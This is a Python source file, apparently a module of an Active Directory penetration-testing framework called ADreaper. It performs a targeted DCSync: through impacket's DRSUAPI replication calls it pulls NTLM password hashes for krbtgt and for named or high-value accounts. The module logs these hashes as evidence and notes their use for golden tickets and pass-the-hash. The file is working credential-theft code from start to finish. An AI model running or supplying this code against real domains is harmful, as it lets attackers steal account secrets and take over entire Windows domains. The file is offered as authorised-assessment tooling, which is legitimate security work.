"""Targeted DCSync — prove the impact of a replication-rights finding.

`recon/acl_enum` flags principals that hold GetChanges + GetChangesAll on the
domain (a DCSync edge). This module is the *proof*: acting as such a principal, it
replicates specific accounts' secrets over MS-DRSR (the same DRSUAPI path
impacket's secretsdump uses) and reports the recovered NTLM hashes — with
`krbtgt` being the golden-ticket crown jewel.

Deliberately **targeted, not a domain-wide dump.** It replicates only the accounts
you name, plus `krbtgt` and any principals already marked high-value / owned in the
graph. There is no "extract every secret in the domain" switch: ADreaper assesses
and demonstrates impact; it is not a mass-exfiltration tool. DCSync is a read
operation and does not trip account lockout.

Requires a principal that already has replication rights — run `recon/acl_enum`
first to confirm one exists.
"""

from __future__ import annotations

from typing import Optional

from adreaper.core.context import EngagementContext
from adreaper.core.graph import NodeType
from adreaper.core.logging import log
from adreaper.core.module import BaseModule, ModuleResult, Option, OptionType, Severity


class DCSync(BaseModule):
    name = "credentials/dcsync"
    description = "Replicate targeted account secrets via DRSUAPI (proves DCSync rights)."
    author = "Mealmeu"
    category = "credentials"
    requires = ["impacket"]
    references = [
        "https://attack.mitre.org/techniques/T1003/006/",
        "https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync",
    ]
    options = [
        Option("target", "DC host/IP to replicate from (defaults to --dc-ip)",
               type=OptionType.STRING),
        Option("user", "Comma-separated sAMAccountNames to sync "
                        "(default: krbtgt + graph high-value/owned)", type=OptionType.STRING),
    ]

    def run(self, ctx: EngagementContext) -> ModuleResult:
        res = self.result()
        target = self.opt("target") or ctx.primary_target()
        if not target:
            return res.fail("no DC target (use --dc-ip or --target)").finish()
        cred = ctx.credential
        if not cred.has_secret:
            return res.fail("DCSync needs authenticated creds with replication rights").finish()

        explicit = _split(self.opt("user"))
        targets = select_targets(ctx.graph, explicit)
        if not targets:
            return res.fail("no accounts to sync (pass -o user=krbtgt,...)").finish()
        log.info("DCSync: replicating %d targeted account(s) from %s", len(targets), target)

        secrets = self._replicate(ctx, target, targets, res)
        if not secrets:
            res.add_finding(
                "DCSync produced no secrets",
                Severity.INFO,
                description="The bind succeeded but no targeted account replicated — the identity "
                            "may lack GetChanges/GetChangesAll, or the names were wrong.",
            )
            return res.finish()

        for sec in secrets:
            self._report(ctx, res, sec)
        log.ok("DCSync recovered %d account secret(s)", len(secrets))
        res.data["accounts"] = [s["user"] for s in secrets]
        return res.finish()

    # -- impacket DRSUAPI (secretsdump machinery) ------------------------

    def _replicate(self, ctx, target, targets, res) -> list[dict]:
        cred = ctx.credential
        lm, nt = _hashes(cred)
        collected: list[dict] = []
        try:
            from impacket.smbconnection import SMBConnection  # type: ignore
            from impacket.examples.secretsdump import (  # type: ignore
                NTDSHashes, RemoteOperations,
            )
        except Exception as e:  # pragma: no cover - env without impacket
            res.fail(f"impacket secretsdump unavailable: {e}")
            return collected

        try:
            smb = SMBConnection(target, target, timeout=ctx.timeout)
            smb.login(cred.username, cred.password, cred.domain, lm, nt)
        except Exception as e:
            res.fail(f"SMB login to {target} failed: {e}")
            return collected

        remote_ops = None
        try:
            remote_ops = RemoteOperations(smb, False, None)
            for user in targets:
                lines: list[str] = []
                try:
                    nh = NTDSHashes(
                        None, None, isRemote=True, history=False, noLMHash=True,
                        remoteOps=remote_ops, useVSSMethod=False, justNTLM=True,
                        pwdLastSet=False, resumeSession=None, outputFileName=None,
                        justUser=user, printUserStatus=False,
                        perSecretCallback=lambda _t, s: lines.append(s),
                    )
                    nh.dump()
                    nh.finish()
                except Exception as e:
                    log.debug("DCSync of %s failed: %s", user, e)
                    continue
                for line in lines:
                    parsed = parse_secret_line(line)
                    if parsed:
                        collected.append(parsed)
        finally:
            try:
                if remote_ops:
                    remote_ops.finish()
                smb.logoff()
            except Exception:
                pass
        return collected

    def _report(self, ctx, res, sec) -> None:
        user = sec["user"]
        krbtgt = is_krbtgt(user)
        sev = Severity.CRITICAL
        title = (f"krbtgt hash recovered — full domain compromise (golden ticket)"
                 if krbtgt else f"Account secret recovered via DCSync: {user}")
        res.add_finding(
            title, sev,
            description=("With the krbtgt NTLM hash an attacker can forge golden tickets and "
                         "impersonate any principal indefinitely."
                         if krbtgt else
                         "The account's NTLM hash was replicated and can be cracked or "
                         "used for pass-the-hash."),
            evidence=f"{user}:{sec['rid']}:{sec['lmhash']}:{sec['nthash']}:::",
            target=user,
            references=["https://attack.mitre.org/techniques/T1003/006/"],
        )
        short = user.split("\\")[-1]
        for n in ctx.graph.find(short, NodeType.USER):
            ctx.graph.mark_owned(n.id)


# ---------------------------------------------------------------------------
# pure helpers (unit-tested)
# ---------------------------------------------------------------------------

def select_targets(graph, explicit: list[str]) -> list[str]:
    """Choose accounts to replicate: explicit names win; otherwise krbtgt plus
    every high-value / owned user in the graph. Returns a de-duplicated,
    order-stable list with krbtgt first when present."""
    if explicit:
        return _dedup(explicit)
    picks = ["krbtgt"]
    for n in graph.nodes_of(NodeType.USER):
        if n.properties.get("high_value") or n.properties.get("owned"):
            picks.append(n.name)
    return _dedup(picks)


def parse_secret_line(line: str) -> Optional[dict]:
    """Parse a secretsdump NTLM line 'DOMAIN\\user:rid:lm:nt:::' into a dict.

    Returns None for non-NTLM lines (kerberos keys, cleartext, malformed) so the
    caller only records password hashes.
    """
    if not line or ":" not in line:
        return None
    parts = line.split(":")
    if len(parts) < 4:
        return None
    user, rid, lmhash, nthash = parts[0], parts[1], parts[2], parts[3]
    if not user or not rid.isdigit():
        return None
    if len(nthash) != 32 or not _is_hex(nthash):
        return None
    return {"user": user, "rid": rid, "lmhash": lmhash, "nthash": nthash}


def is_krbtgt(name: str) -> bool:
    return name.split("\\")[-1].split("@")[0].strip().lower() == "krbtgt"


# ---------------------------------------------------------------------------
# small helpers
# ---------------------------------------------------------------------------

def _dedup(names: list[str]) -> list[str]:
    seen: set[str] = set()
    out: list[str] = []
    for n in names:
        key = n.split("\\")[-1].strip().lower()
        if key and key not in seen:
            seen.add(key)
            out.append(n.split("\\")[-1].strip())
    return out


def _split(v) -> list[str]:
    if not v:
        return []
    return [x.strip() for x in str(v).split(",") if x.strip()]


def _is_hex(s: str) -> bool:
    try:
        int(s, 16)
        return True
    except ValueError:
        return False


def _hashes(cred) -> tuple[str, str]:
    norm = cred.normalized_hash()
    if norm:
        lm, nt = norm.split(":", 1)
        return lm, nt
    return "", ""
